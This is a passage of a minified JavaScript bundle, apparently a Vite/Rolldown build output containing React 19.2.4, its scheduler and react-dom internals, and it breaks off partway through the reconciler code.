var e=Object.create,t=Object.defineProperty,n=Object.getOwnPropertyDescriptor,r=Object.getOwnPropertyNames,i=Object.getPrototypeOf,a=Object.prototype.hasOwnProperty,o=(e,t)=>()=>(e&&(t=e(e=0)),t),s=(e,t)=>()=>(t||e((t={exports:{}}).exports,t),t.exports),c=(e,n)=>{let r={};for(var i in e)t(r,i,{get:e[i],enumerable:!0});return n||t(r,Symbol.toStringTag,{value:`Module`}),r},l=(e,i,o,s)=>{if(i&&typeof i==`object`||typeof i==`function`)for(var c=r(i),l=0,u=c.length,d;l<u;l++)d=c[l],!a.call(e,d)&&d!==o&&t(e,d,{get:(e=>i[e]).bind(null,d),enumerable:!(s=n(i,d))||s.enumerable});return e},u=(n,r,a)=>(a=n==null?{}:e(i(n)),l(r||!n||!n.__esModule?t(a,`default`,{value:n,enumerable:!0}):a,n)),d=e=>a.call(e,`module.exports`)?e[`module.exports`]:l(t({},`__esModule`,{value:!0}),e);(function(){let e=document.createElement(`link`).relList;if(e&&e.supports&&e.supports(`modulepreload`))return;for(let e of document.querySelectorAll(`link[rel="modulepreload"]`))n(e);new MutationObserver(e=>{for(let t of e)if(t.type===`childList`)for(let e of t.addedNodes)e.tagName===`LINK`&&e.rel===`modulepreload`&&n(e)}).observe(document,{childList:!0,subtree:!0});function t(e){let t={};return e.integrity&&(t.integrity=e.integrity),e.referrerPolicy&&(t.referrerPolicy=e.referrerPolicy),e.crossOrigin===`use-credentials`?t.credentials=`include`:e.crossOrigin===`anonymous`?t.credentials=`omit`:t.credentials=`same-origin`,t}function n(e){if(e.ep)return;e.ep=!0;let n=t(e);fetch(e.href,n)}})();var f=s((e=>{var t=Symbol.for(`react.transitional.element`),n=Symbol.for(`react.portal`),r=Symbol.for(`react.fragment`),i=Symbol.for(`react.strict_mode`),a=Symbol.for(`react.profiler`),o=Symbol.for(`react.consumer`),s=Symbol.for(`react.context`),c=Symbol.for(`react.forward_ref`),l=Symbol.for(`react.suspense`),u=Symbol.for(`react.memo`),d=Symbol.for(`react.lazy`),f=Symbol.for(`react.activity`),p=Symbol.iterator;function m(e){return typeof e!=`object`||!e?null:(e=p&&e[p]||e[`@@iterator`],typeof e==`function`?e:null)}var h={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},g=Object.assign,_={};function v(e,t,n){this.props=e,this.context=t,this.refs=_,this.updater=n||h}v.prototype.isReactComponent={},v.prototype.setState=function(e,t){if(typeof e!=`object`&&typeof e!=`function`&&e!=null)throw Error(`takes an object of state variables to update or a function which returns an object of state variables.`);this.updater.enqueueSetState(this,e,t,`setState`)},v.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,`forceUpdate`)};function y(){}y.prototype=v.prototype;function b(e,t,n){this.props=e,this.context=t,this.refs=_,this.updater=n||h}var x=b.prototype=new y;x.constructor=b,g(x,v.prototype),x.isPureReactComponent=!0;var S=Array.isArray;function C(){}var w={H:null,A:null,T:null,S:null},T=Object.prototype.hasOwnProperty;function E(e,n,r){var i=r.ref;return{$$typeof:t,type:e,key:n,ref:i===void 0?null:i,props:r}}function ee(e,t){return E(e.type,t,e.props)}function D(e){return typeof e==`object`&&!!e&&e.$$typeof===t}function O(e){var t={"=":`=0`,":":`=2`};return`$`+e.replace(/[=:]/g,function(e){return t[e]})}var te=/\/+/g;function ne(e,t){return typeof e==`object`&&e&&e.key!=null?O(``+e.key):t.toString(36)}function re(e){switch(e.status){case`fulfilled`:return e.value;case`rejected`:throw e.reason;default:switch(typeof e.status==`string`?e.then(C,C):(e.status=`pending`,e.then(function(t){e.status===`pending`&&(e.status=`fulfilled`,e.value=t)},function(t){e.status===`pending`&&(e.status=`rejected`,e.reason=t)})),e.status){case`fulfilled`:return e.value;case`rejected`:throw e.reason}}throw e}function ie(e,r,i,a,o){var s=typeof e;(s===`undefined`||s===`boolean`)&&(e=null);var c=!1;if(e===null)c=!0;else switch(s){case`bigint`:case`string`:case`number`:c=!0;break;case`object`:switch(e.$$typeof){case t:case n:c=!0;break;case d:return c=e._init,ie(c(e._payload),r,i,a,o)}}if(c)return o=o(e),c=a===``?`.`+ne(e,0):a,S(o)?(i=``,c!=null&&(i=c.replace(te,`$&/`)+`/`),ie(o,r,i,``,function(e){return e})):o!=null&&(D(o)&&(o=ee(o,i+(o.key==null||e&&e.key===o.key?``:(``+o.key).replace(te,`$&/`)+`/`)+c)),r.push(o)),1;c=0;var l=a===``?`.`:a+`:`;if(S(e))for(var u=0;u<e.length;u++)a=e[u],s=l+ne(a,u),c+=ie(a,r,i,s,o);else if(u=m(e),typeof u==`function`)for(e=u.call(e),u=0;!(a=e.next()).done;)a=a.value,s=l+ne(a,u++),c+=ie(a,r,i,s,o);else if(s===`object`){if(typeof e.then==`function`)return ie(re(e),r,i,a,o);throw r=String(e),Error(`Objects are not valid as a React child (found: `+(r===`[object Object]`?`object with keys {`+Object.keys(e).join(`, `)+`}`:r)+`). If you meant to render a collection of children, use an array instead.`)}return c}function ae(e,t,n){if(e==null)return e;var r=[],i=0;return ie(e,r,``,``,function(e){return t.call(n,e,i++)}),r}function oe(e){if(e._status===-1){var t=e._result;t=t(),t.then(function(t){(e._status===0||e._status===-1)&&(e._status=1,e._result=t)},function(t){(e._status===0||e._status===-1)&&(e._status=2,e._result=t)}),e._status===-1&&(e._status=0,e._result=t)}if(e._status===1)return e._result.default;throw e._result}var k=typeof reportError==`function`?reportError:function(e){if(typeof window==`object`&&typeof window.ErrorEvent==`function`){var t=new window.ErrorEvent(`error`,{bubbles:!0,cancelable:!0,message:typeof e==`object`&&e&&typeof e.message==`string`?String(e.message):String(e),error:e});if(!window.dispatchEvent(t))return}else if(typeof process==`object`&&typeof process.emit==`function`){process.emit(`uncaughtException`,e);return}console.error(e)},A={map:ae,forEach:function(e,t,n){ae(e,function(){t.apply(this,arguments)},n)},count:function(e){var t=0;return ae(e,function(){t++}),t},toArray:function(e){return ae(e,function(e){return e})||[]},only:function(e){if(!D(e))throw Error(`React.Children.only expected to receive a single React element child.`);return e}};e.Activity=f,e.Children=A,e.Component=v,e.Fragment=r,e.Profiler=a,e.PureComponent=b,e.StrictMode=i,e.Suspense=l,e.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=w,e.__COMPILER_RUNTIME={__proto__:null,c:function(e){return w.H.useMemoCache(e)}},e.cache=function(e){return function(){return e.apply(null,arguments)}},e.cacheSignal=function(){return null},e.cloneElement=function(e,t,n){if(e==null)throw Error(`The argument must be a React element, but you passed `+e+`.`);var r=g({},e.props),i=e.key;if(t!=null)for(a in t.key!==void 0&&(i=``+t.key),t)!T.call(t,a)||a===`key`||a===`__self`||a===`__source`||a===`ref`&&t.ref===void 0||(r[a]=t[a]);var a=arguments.length-2;if(a===1)r.children=n;else if(1<a){for(var o=Array(a),s=0;s<a;s++)o[s]=arguments[s+2];r.children=o}return E(e.type,i,r)},e.createContext=function(e){return e={$$typeof:s,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null},e.Provider=e,e.Consumer={$$typeof:o,_context:e},e},e.createElement=function(e,t,n){var r,i={},a=null;if(t!=null)for(r in t.key!==void 0&&(a=``+t.key),t)T.call(t,r)&&r!==`key`&&r!==`__self`&&r!==`__source`&&(i[r]=t[r]);var o=arguments.length-2;if(o===1)i.children=n;else if(1<o){for(var s=Array(o),c=0;c<o;c++)s[c]=arguments[c+2];i.children=s}if(e&&e.defaultProps)for(r in o=e.defaultProps,o)i[r]===void 0&&(i[r]=o[r]);return E(e,a,i)},e.createRef=function(){return{current:null}},e.forwardRef=function(e){return{$$typeof:c,render:e}},e.isValidElement=D,e.lazy=function(e){return{$$typeof:d,_payload:{_status:-1,_result:e},_init:oe}},e.memo=function(e,t){return{$$typeof:u,type:e,compare:t===void 0?null:t}},e.startTransition=function(e){var t=w.T,n={};w.T=n;try{var r=e(),i=w.S;i!==null&&i(n,r),typeof r==`object`&&r&&typeof r.then==`function`&&r.then(C,k)}catch(e){k(e)}finally{t!==null&&n.types!==null&&(t.types=n.types),w.T=t}},e.unstable_useCacheRefresh=function(){return w.H.useCacheRefresh()},e.use=function(e){return w.H.use(e)},e.useActionState=function(e,t,n){return w.H.useActionState(e,t,n)},e.useCallback=function(e,t){return w.H.useCallback(e,t)},e.useContext=function(e){return w.H.useContext(e)},e.useDebugValue=function(){},e.useDeferredValue=function(e,t){return w.H.useDeferredValue(e,t)},e.useEffect=function(e,t){return w.H.useEffect(e,t)},e.useEffectEvent=function(e){return w.H.useEffectEvent(e)},e.useId=function(){return w.H.useId()},e.useImperativeHandle=function(e,t,n){return w.H.useImperativeHandle(e,t,n)},e.useInsertionEffect=function(e,t){return w.H.useInsertionEffect(e,t)},e.useLayoutEffect=function(e,t){return w.H.useLayoutEffect(e,t)},e.useMemo=function(e,t){return w.H.useMemo(e,t)},e.useOptimistic=function(e,t){return w.H.useOptimistic(e,t)},e.useReducer=function(e,t,n){return w.H.useReducer(e,t,n)},e.useRef=function(e){return w.H.useRef(e)},e.useState=function(e){return w.H.useState(e)},e.useSyncExternalStore=function(e,t,n){return w.H.useSyncExternalStore(e,t,n)},e.useTransition=function(){return w.H.useTransition()},e.version=`19.2.4`})),p=s(((e,t)=>{t.exports=f()})),m=s((e=>{function t(e,t){var n=e.length;e.push(t);a:for(;0<n;){var r=n-1>>>1,a=e[r];if(0<i(a,t))e[r]=t,e[n]=a,n=r;else break a}}function n(e){return e.length===0?null:e[0]}function r(e){if(e.length===0)return null;var t=e[0],n=e.pop();if(n!==t){e[0]=n;a:for(var r=0,a=e.length,o=a>>>1;r<o;){var s=2*(r+1)-1,c=e[s],l=s+1,u=e[l];if(0>i(c,n))l<a&&0>i(u,c)?(e[r]=u,e[l]=n,r=l):(e[r]=c,e[s]=n,r=s);else if(l<a&&0>i(u,n))e[r]=u,e[l]=n,r=l;else break a}}return t}function i(e,t){var n=e.sortIndex-t.sortIndex;return n===0?e.id-t.id:n}if(e.unstable_now=void 0,typeof performance==`object`&&typeof performance.now==`function`){var a=performance;e.unstable_now=function(){return a.now()}}else{var o=Date,s=o.now();e.unstable_now=function(){return o.now()-s}}var c=[],l=[],u=1,d=null,f=3,p=!1,m=!1,h=!1,g=!1,_=typeof setTimeout==`function`?setTimeout:null,v=typeof clearTimeout==`function`?clearTimeout:null,y=typeof setImmediate<`u`?setImmediate:null;function b(e){for(var i=n(l);i!==null;){if(i.callback===null)r(l);else if(i.startTime<=e)r(l),i.sortIndex=i.expirationTime,t(c,i);else break;i=n(l)}}function x(e){if(h=!1,b(e),!m)if(n(c)!==null)m=!0,S||(S=!0,D());else{var t=n(l);t!==null&&ne(x,t.startTime-e)}}var S=!1,C=-1,w=5,T=-1;function E(){return g?!0:!(e.unstable_now()-T<w)}function ee(){if(g=!1,S){var t=e.unstable_now();T=t;var i=!0;try{a:{m=!1,h&&(h=!1,v(C),C=-1),p=!0;var a=f;try{b:{for(b(t),d=n(c);d!==null&&!(d.expirationTime>t&&E());){var o=d.callback;if(typeof o==`function`){d.callback=null,f=d.priorityLevel;var s=o(d.expirationTime<=t);if(t=e.unstable_now(),typeof s==`function`){d.callback=s,b(t),i=!0;break b}d===n(c)&&r(c),b(t)}else r(c);d=n(c)}if(d!==null)i=!0;else{var u=n(l);u!==null&&ne(x,u.startTime-t),i=!1}}break a}finally{d=null,f=a,p=!1}i=void 0}}finally{i?D():S=!1}}}var D;if(typeof y==`function`)D=function(){y(ee)};else if(typeof MessageChannel<`u`){var O=new MessageChannel,te=O.port2;O.port1.onmessage=ee,D=function(){te.postMessage(null)}}else D=function(){_(ee,0)};function ne(t,n){C=_(function(){t(e.unstable_now())},n)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(e){e.callback=null},e.unstable_forceFrameRate=function(e){0>e||125<e?console.error(`forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported`):w=0<e?Math.floor(1e3/e):5},e.unstable_getCurrentPriorityLevel=function(){return f},e.unstable_next=function(e){switch(f){case 1:case 2:case 3:var t=3;break;default:t=f}var n=f;f=t;try{return e()}finally{f=n}},e.unstable_requestPaint=function(){g=!0},e.unstable_runWithPriority=function(e,t){switch(e){case 1:case 2:case 3:case 4:case 5:break;default:e=3}var n=f;f=e;try{return t()}finally{f=n}},e.unstable_scheduleCallback=function(r,i,a){var o=e.unstable_now();switch(typeof a==`object`&&a?(a=a.delay,a=typeof a==`number`&&0<a?o+a:o):a=o,r){case 1:var s=-1;break;case 2:s=250;break;case 5:s=1073741823;break;case 4:s=1e4;break;default:s=5e3}return s=a+s,r={id:u++,callback:i,priorityLevel:r,startTime:a,expirationTime:s,sortIndex:-1},a>o?(r.sortIndex=a,t(l,r),n(c)===null&&r===n(l)&&(h?(v(C),C=-1):h=!0,ne(x,a-o))):(r.sortIndex=s,t(c,r),m||p||(m=!0,S||(S=!0,D()))),r},e.unstable_shouldYield=E,e.unstable_wrapCallback=function(e){var t=f;return function(){var n=f;f=t;try{return e.apply(this,arguments)}finally{f=n}}}})),h=s(((e,t)=>{t.exports=m()})),g=s((e=>{var t=p();function n(e){var t=`https://react.dev/errors/`+e;if(1<arguments.length){t+=`?args[]=`+encodeURIComponent(arguments[1]);for(var n=2;n<arguments.length;n++)t+=`&args[]=`+encodeURIComponent(arguments[n])}return`Minified React error #`+e+`; visit `+t+` for the full message or use the non-minified dev environment for full errors and additional helpful warnings.`}function r(){}var i={d:{f:r,r:function(){throw Error(n(522))},D:r,C:r,L:r,m:r,X:r,S:r,M:r},p:0,findDOMNode:null},a=Symbol.for(`react.portal`);function o(e,t,n){var r=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:a,key:r==null?null:``+r,children:e,containerInfo:t,implementation:n}}var s=t.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;function c(e,t){if(e===`font`)return``;if(typeof t==`string`)return t===`use-credentials`?t:``}e.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=i,e.createPortal=function(e,t){var r=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11)throw Error(n(299));return o(e,t,null,r)},e.flushSync=function(e){var t=s.T,n=i.p;try{if(s.T=null,i.p=2,e)return e()}finally{s.T=t,i.p=n,i.d.f()}},e.preconnect=function(e,t){typeof e==`string`&&(t?(t=t.crossOrigin,t=typeof t==`string`?t===`use-credentials`?t:``:void 0):t=null,i.d.C(e,t))},e.prefetchDNS=function(e){typeof e==`string`&&i.d.D(e)},e.preinit=function(e,t){if(typeof e==`string`&&t&&typeof t.as==`string`){var n=t.as,r=c(n,t.crossOrigin),a=typeof t.integrity==`string`?t.integrity:void 0,o=typeof t.fetchPriority==`string`?t.fetchPriority:void 0;n===`style`?i.d.S(e,typeof t.precedence==`string`?t.precedence:void 0,{crossOrigin:r,integrity:a,fetchPriority:o}):n===`script`&&i.d.X(e,{crossOrigin:r,integrity:a,fetchPriority:o,nonce:typeof t.nonce==`string`?t.nonce:void 0})}},e.preinitModule=function(e,t){if(typeof e==`string`)if(typeof t==`object`&&t){if(t.as==null||t.as===`script`){var n=c(t.as,t.crossOrigin);i.d.M(e,{crossOrigin:n,integrity:typeof t.integrity==`string`?t.integrity:void 0,nonce:typeof t.nonce==`string`?t.nonce:void 0})}}else t??i.d.M(e)},e.preload=function(e,t){if(typeof e==`string`&&typeof t==`object`&&t&&typeof t.as==`string`){var n=t.as,r=c(n,t.crossOrigin);i.d.L(e,n,{crossOrigin:r,integrity:typeof t.integrity==`string`?t.integrity:void 0,nonce:typeof t.nonce==`string`?t.nonce:void 0,type:typeof t.type==`string`?t.type:void 0,fetchPriority:typeof t.fetchPriority==`string`?t.fetchPriority:void 0,referrerPolicy:typeof t.referrerPolicy==`string`?t.referrerPolicy:void 0,imageSrcSet:typeof t.imageSrcSet==`string`?t.imageSrcSet:void 0,imageSizes:typeof t.imageSizes==`string`?t.imageSizes:void 0,media:typeof t.media==`string`?t.media:void 0})}},e.preloadModule=function(e,t){if(typeof e==`string`)if(t){var n=c(t.as,t.crossOrigin);i.d.m(e,{as:typeof t.as==`string`&&t.as!==`script`?t.as:void 0,crossOrigin:n,integrity:typeof t.integrity==`string`?t.integrity:void 0})}else i.d.m(e)},e.requestFormReset=function(e){i.d.r(e)},e.unstable_batchedUpdates=function(e,t){return e(t)},e.useFormState=function(e,t,n){return s.H.useFormState(e,t,n)},e.useFormStatus=function(){return s.H.useHostTransitionStatus()},e.version=`19.2.4`})),_=s(((e,t)=>{function n(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>`u`||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!=`function`))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(n)}catch(e){console.error(e)}}n(),t.exports=g()})),v=s((e=>{var t=h(),n=p(),r=_();function i(e){var t=`https://react.dev/errors/`+e;if(1<arguments.length){t+=`?args[]=`+encodeURIComponent(arguments[1]);for(var n=2;n<arguments.length;n++)t+=`&args[]=`+encodeURIComponent(arguments[n])}return`Minified React error #`+e+`; visit `+t+` for the full message or use the non-minified dev environment for full errors and additional helpful warnings.`}function a(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function o(e){var t=e,n=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,t.flags&4098&&(n=t.return),e=t.return;while(e)}return t.tag===3?n:null}function s(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function c(e){if(e.tag===31){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function l(e){if(o(e)!==e)throw Error(i(188))}function u(e){var t=e.alternate;if(!t){if(t=o(e),t===null)throw Error(i(188));return t===e?e:null}for(var n=e,r=t;;){var a=n.return;if(a===null)break;var s=a.alternate;if(s===null){if(r=a.return,r!==null){n=r;continue}break}if(a.child===s.child){for(s=a.child;s;){if(s===n)return l(a),e;if(s===r)return l(a),t;s=s.sibling}throw Error(i(188))}if(n.return!==r.return)n=a,r=s;else{for(var c=!1,u=a.child;u;){if(u===n){c=!0,n=a,r=s;break}if(u===r){c=!0,r=a,n=s;break}u=u.sibling}if(!c){for(u=s.child;u;){if(u===n){c=!0,n=s,r=a;break}if(u===r){c=!0,r=s,n=a;break}u=u.sibling}if(!c)throw Error(i(189))}}if(n.alternate!==r)throw Error(i(190))}if(n.tag!==3)throw Error(i(188));return n.stateNode.current===n?e:t}function d(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e;for(e=e.child;e!==null;){if(t=d(e),t!==null)return t;e=e.sibling}return null}var f=Object.assign,m=Symbol.for(`react.element`),g=Symbol.for(`react.transitional.element`),v=Symbol.for(`react.portal`),y=Symbol.for(`react.fragment`),b=Symbol.for(`react.strict_mode`),x=Symbol.for(`react.profiler`),S=Symbol.for(`react.consumer`),C=Symbol.for(`react.context`),w=Symbol.for(`react.forward_ref`),T=Symbol.for(`react.suspense`),E=Symbol.for(`react.suspense_list`),ee=Symbol.for(`react.memo`),D=Symbol.for(`react.lazy`),O=Symbol.for(`react.activity`),te=Symbol.for(`react.memo_cache_sentinel`),ne=Symbol.iterator;function re(e){return typeof e!=`object`||!e?null:(e=ne&&e[ne]||e[`@@iterator`],typeof e==`function`?e:null)}var ie=Symbol.for(`react.client.reference`);function ae(e){if(e==null)return null;if(typeof e==`function`)return e.$$typeof===ie?null:e.displayName||e.name||null;if(typeof e==`string`)return e;switch(e){case y:return`Fragment`;case x:return`Profiler`;case b:return`StrictMode`;case T:return`Suspense`;case E:return`SuspenseList`;case O:return`Activity`}if(typeof e==`object`)switch(e.$$typeof){case v:return`Portal`;case C:return e.displayName||`Context`;case S:return(e._context.displayName||`Context`)+`.Consumer`;case w:var t=e.render;return e=e.displayName,e||=(e=t.displayName||t.name||``,e===``?`ForwardRef`:`ForwardRef(`+e+`)`),e;case ee:return t=e.displayName||null,t===null?ae(e.type)||`Memo`:t;case D:t=e._payload,e=e._init;try{return ae(e(t))}catch{}}return null}var oe=Array.isArray,k=n.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,A=r.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,se={pending:!1,data:null,method:null,action:null},ce=[],le=-1;function ue(e){return{current:e}}function de(e){0>le||(e.current=ce[le],ce[le]=null,le--)}function fe(e,t){le++,ce[le]=e.current,e.current=t}var pe=ue(null),me=ue(null),he=ue(null),ge=ue(null);function _e(e,t){switch(fe(he,t),fe(me,e),fe(pe,null),t.nodeType){case 9:case 11:e=(e=t.documentElement)&&(e=e.namespaceURI)?qd(e):0;break;default:if(e=t.tagName,t=t.namespaceURI)t=qd(t),e=Jd(t,e);else switch(e){case`svg`:e=1;break;case`math`:e=2;break;default:e=0}}de(pe),fe(pe,e)}function ve(){de(pe),de(me),de(he)}function ye(e){e.memoizedState!==null&&fe(ge,e);var t=pe.current,n=Jd(t,e.type);t!==n&&(fe(me,e),fe(pe,n))}function be(e){me.current===e&&(de(pe),de(me)),ge.current===e&&(de(ge),ip._currentValue=se)}var xe,Se;function Ce(e){if(xe===void 0)try{throw Error()}catch(e){var t=e.stack.trim().match(/\n( *(at )?)/);xe=t&&t[1]||``,Se=-1<e.stack.indexOf(`
    at`)?` (<anonymous>)`:-1<e.stack.indexOf(`@`)?`@unknown:0:0`:``}return`
`+xe+e+Se}var we=!1;function Te(e,t){if(!e||we)return``;we=!0;var n=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{var r={DetermineComponentFrameRoot:function(){try{if(t){var n=function(){throw Error()};if(Object.defineProperty(n.prototype,`props`,{set:function(){throw Error()}}),typeof Reflect==`object`&&Reflect.construct){try{Reflect.construct(n,[])}catch(e){var r=e}Reflect.construct(e,[],n)}else{try{n.call()}catch(e){r=e}e.call(n.prototype)}}else{try{throw Error()}catch(e){r=e}(n=e())&&typeof n.catch==`function`&&n.catch(function(){})}}catch(e){if(e&&r&&typeof e.stack==`string`)return[e.stack,r.stack]}return[null,null]}};r.DetermineComponentFrameRoot.displayName=`DetermineComponentFrameRoot`;var i=Object.getOwnPropertyDescriptor(r.DetermineComponentFrameRoot,`name`);i&&i.configurable&&Object.defineProperty(r.DetermineComponentFrameRoot,`name`,{value:`DetermineComponentFrameRoot`});var a=r.DetermineComponentFrameRoot(),o=a[0],s=a[1];if(o&&s){var c=o.split(`
`),l=s.split(`
`);for(i=r=0;r<c.length&&!c[r].includes(`DetermineComponentFrameRoot`);)r++;for(;i<l.length&&!l[i].includes(`DetermineComponentFrameRoot`);)i++;if(r===c.length||i===l.length)for(r=c.length-1,i=l.length-1;1<=r&&0<=i&&c[r]!==l[i];)i--;for(;1<=r&&0<=i;r--,i--)if(c[r]!==l[i]){if(r!==1||i!==1)do if(r--,i--,0>i||c[r]!==l[i]){var u=`
`+c[r].replace(` at new `,` at `);return e.displayName&&u.includes(`<anonymous>`)&&(u=u.replace(`<anonymous>`,e.displayName)),u}while(1<=r&&0<=i);break}}}finally{we=!1,Error.prepareStackTrace=n}return(n=e?e.displayName||e.name:``)?Ce(n):``}function Ee(e,t){switch(e.tag){case 26:case 27:case 5:return Ce(e.type);case 16:return Ce(`Lazy`);case 13:return e.child!==t&&t!==null?Ce(`Suspense Fallback`):Ce(`Suspense`);case 19:return Ce(`SuspenseList`);case 0:case 15:return Te(e.type,!1);case 11:return Te(e.type.render,!1);case 1:return Te(e.type,!0);case 31:return Ce(`Activity`);default:return``}}function De(e){try{var t=``,n=null;do t+=Ee(e,n),n=e,e=e.return;while(e);return t}catch(e){return`
Error generating stack: `+e.message+`
`+e.stack}}var Oe=Object.prototype.hasOwnProperty,ke=t.unstable_scheduleCallback,Ae=t.unstable_cancelCallback,je=t.unstable_shouldYield,Me=t.unstable_requestPaint,Ne=t.unstable_now,Pe=t.unstable_getCurrentPriorityLevel,Fe=t.unstable_ImmediatePriority,Ie=t.unstable_UserBlockingPriority,Le=t.unstable_NormalPriority,Re=t.unstable_LowPriority,ze=t.unstable_IdlePriority,Be=t.log,Ve=t.unstable_setDisableYieldValue,He=null,Ue=null;function We(e){if(typeof Be==`function`&&Ve(e),Ue&&typeof Ue.setStrictMode==`function`)try{Ue.setStrictMode(He,e)}catch{}}var Ge=Math.clz32?Math.clz32:Je,Ke=Math.log,qe=Math.LN2;function Je(e){return e>>>=0,e===0?32:31-(Ke(e)/qe|0)|0}var Ye=256,Xe=262144,Ze=4194304;function Qe(e){var t=e&42;if(t!==0)return t;switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:return 64;case 128:return 128;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:return e&261888;case 262144:case 524288:case 1048576:case 2097152:return e&3932160;case 4194304:case 8388608:case 16777216:case 33554432:return e&62914560;case 67108864:return 67108864;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 0;default:return e}}function $e(e,t,n){var r=e.pendingLanes;if(r===0)return 0;var i=0,a=e.suspendedLanes,o=e.pingedLanes;e=e.warmLanes;var s=r&134217727;return s===0?(s=r&~a,s===0?o===0?n||(n=r&~e,n!==0&&(i=Qe(n))):i=Qe(o):i=Qe(s)):(r=s&~a,r===0?(o&=s,o===0?n||(n=s&~e,n!==0&&(i=Qe(n))):i=Qe(o)):i=Qe(r)),i===0?0:t!==0&&t!==i&&(t&a)===0&&(a=i&-i,n=t&-t,a>=n||a===32&&n&4194048)?t:i}function et(e,t){return(e.pendingLanes&~(e.suspendedLanes&~e.pingedLanes)&t)===0}function tt(e,t){switch(e){case 1:case 2:case 4:case 8:case 64:return t+250;case 16:case 32:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:return-1;case 67108864:case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function nt(){var e=Ze;return Ze<<=1,!(Ze&62914560)&&(Ze=4194304),e}function rt(e){for(var t=[],n=0;31>n;n++)t.push(e);return t}function it(e,t){e.pendingLanes|=t,t!==268435456&&(e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0)}function at(e,t,n,r,i,a){var o=e.pendingLanes;e.pendingLanes=n,e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0,e.expiredLanes&=n,e.entangledLanes&=n,e.errorRecoveryDisabledLanes&=n,e.shellSuspendCounter=0;var s=e.entanglements,c=e.expirationTimes,l=e.hiddenUpdates;for(n=o&~n;0<n;){var u=31-Ge(n),d=1<<u;s[u]=0,c[u]=-1;var f=l[u];if(f!==null)for(l[u]=null,u=0;u<f.length;u++){var p=f[u];p!==null&&(p.lane&=-536870913)}n&=~d}r!==0&&ot(e,r,0),a!==0&&i===0&&e.tag!==0&&(e.suspendedLanes|=a&~(o&~t))}function ot(e,t,n){e.pendingLanes|=t,e.suspendedLanes&=~t;var r=31-Ge(t);e.entangledLanes|=t,e.entanglements[r]=e.entanglements[r]|1073741824|n&261930}function st(e,t){var n=e.entangledLanes|=t;for(e=e.entanglements;n;){var r=31-Ge(n),i=1<<r;i&t|e[r]&t&&(e[r]|=t),n&=~i}}function ct(e,t){var n=t&-t;return n=n&42?1:lt(n),(n&(e.suspendedLanes|t))===0?n:0}function lt(e){switch(e){case 2:e=1;break;case 8:e=4;break;case 32:e=16;break;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:e=128;break;case 268435456:e=134217728;break;default:e=0}return e}function ut(e){return e&=-e,2<e?8<e?e&134217727?32:268435456:8:2}function dt(){var e=A.p;return e===0?(e=window.event,e===void 0?32:bp(e.type)):e}function ft(e,t){var n=A.p;try{return A.p=e,t()}finally{A.p=n}}var pt=Math.random().toString(36).slice(2),mt=`__reactFiber$`+pt,ht=`__reactProps$`+pt,gt=`__reactContainer$`+pt,_t=`__reactEvents$`+pt,vt=`__reactListeners$`+pt,yt=`__reactHandles$`+pt,bt=`__reactResources$`+pt,xt=`__reactMarker$`+pt;function St(e){delete e[mt],delete e[ht],delete e[_t],delete e[vt],delete e[yt]}function Ct(e){var t=e[mt];if(t)return t;for(var n=e.parentNode;n;){if(t=n[gt]||n[mt]){if(n=t.alternate,t.child!==null||n!==null&&n.child!==null)for(e=_f(e);e!==null;){if(n=e[mt])return n;e=_f(e)}return t}e=n,n=e.parentNode}return null}function wt(e){if(e=e[mt]||e[gt]){var t=e.tag;if(t===5||t===6||t===13||t===31||t===26||t===27||t===3)return e}return null}function Tt(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e.stateNode;throw Error(i(33))}function Et(e){var t=e[bt];return t||=e[bt]={hoistableStyles:new Map,hoistableScripts:new Map},t}function Dt(e){e[xt]=!0}var Ot=new Set,kt={};function At(e,t){jt(e,t),jt(e+`Capture`,t)}function jt(e,t){for(kt[e]=t,e=0;e<t.length;e++)Ot.add(t[e])}var 